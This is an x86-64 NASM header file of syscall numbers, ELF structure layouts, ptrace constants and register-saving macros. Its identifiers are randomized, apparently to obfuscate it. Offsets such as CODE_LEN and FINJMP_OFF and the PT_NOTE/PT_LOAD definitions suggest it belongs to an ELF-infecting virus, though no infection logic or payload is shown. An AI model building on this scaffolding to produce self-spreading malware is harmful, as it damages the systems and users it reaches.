; SYSCALL
%define SYS_READ 0
%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_LSEEK 8
%define SYS_MMAP 9
%define SYS_UNMAP 11
%define SYS_SOCKET 41
%define SYS_CONNECT 42
%define SYS_SENDTO 44
%define SYS_RECVFROM 45
%define SYS_EXIT 60
%define SYS_FTRUNCATE 77
%define SYS_PTRACE 101
%define SYS_GETPPID 110
%define SYS_GETDENTS 217

; SOCKET
%define AF_INET 2
%define SOCK_STREAM 1

; OPEN
%define O_RDONLY 0x0000
%define O_WRONLY 0x0001
%define O_RDWR 0x0002
%define O_DIRECTORY 0q0200000
%define O_CREAT 0x0040

; DIRENT
%define D_INO_OFF 0x00
%define D_FOLDER 0x4
%define D_OFF_OFF 0x08
%define D_REG_FILE 0x8
%define D_RECLEN_OFF 0x10
%define D_TYPE 0x12
%define D_NAME 0x13

; MMAP
%define PROT_EXEC 1
%define PROT_READ 2
%define PROT_WRITE 4
%define MAP_SHARED 1
%define MAP_PRIVATE 2
%define MAP_ANONYMOUS 0x20

; LSEEK
%define SEEK_SET 0x0
%define SEEK_END 0x2

; PTRACE
%define PTRACE_TRACEME 0x0
%define PTRACE_DETACH 0x17

%define CODE_LEN (ghCNAWt07 - _start)
%define FINJMP_OFF (MXY4Gz - _start)
%define PAGE_SIZE 0x1000

%define FAM(x) [(rbp - CCMt4EkIm1_size) + x]
%define SOCK(x) [(rbp - sock_size) + x]
%define INF(x) [(rbp - H3YySA_size) + x]

%define CODE_LEN (ghCNAWt07 - _start)
%define FINJMP_OFF (MXY4Gz - _start)
%define PAGE_SIZE 0x1000

struc CCMt4EkIm1
.jtDI7 resb PAGE_SIZE
.YQubpH: resb PAGE_SIZE
.L1RvGtLrvV resq 1
.S3hVnI: resd 1
.K2Ec63tYFT: resd 1
.XHrxa resq 1
endstruc

struc H3YySA
.JaSrTu resq 1
.hgLGl4n resq 1
.IKSulmT resq 1
.nlOrNvtD resb 1
.EABdv resq 1
.i7wP7Ff6f resq 1
.G7Gm7SdHI resq 1
.kHV3h3G resq 1
.K3p8P resq 1 
.mqXShT6 resq 1
.MH3cbV496P resq 1
.oZqfGQqr4 resb 1
.VDkZh1d resq 1
.Ihs92gIz3A resq 1
.yW5MTCni3 resq 1
endstruc

; ELF structures
%define PT_LOAD 0x1
%define PT_NOTE 0x4
%define PF_X 0x1
%define PF_R 0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc Pa6b23jk8
.EtMrM9X: resb 16
.YdoeQ: resw 1
.gqtz5gUz: resw 1
.vycYdrV: resd 1
.Psnrw: resq 1
.jjZMUTUH: resq 1
.YBASwk: resq 1
.zgEY2lDll: resd 1
.REgvtlqvdA: resw 1
.RuuxKANlqm: resw 1
.tymWfKNVxF: resw 1
.yAIAtYRhe: resw 1
.IuDcKlX: resw 1
.YnFit: resw 1
endstruc

struc bNVSGbM
.gAWJeS4: resd 1
.ihfYIw: resd 1
.SjRza15: resq 1
.Hk6z5mo: resq 1
.VbReC2K: resq 1
.dWs1Yt: resq 1
.wi1vl: resq 1
.GRVoiT6bNN: resq 1
endstruc

struc TKRRcH5Nn
.JoP9be: resd 1
.MBCBRBzw: resd 1
.dj4k2: resq 1
.ikNFPT9: resq 1
.O9sm3H7Uh: resq 1
.hAm4v0: resq 1
.dCS21qMiz: resd 1
.dxBEPUh: resd 1
.cUiSEDS resq 1
.tHlMK resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 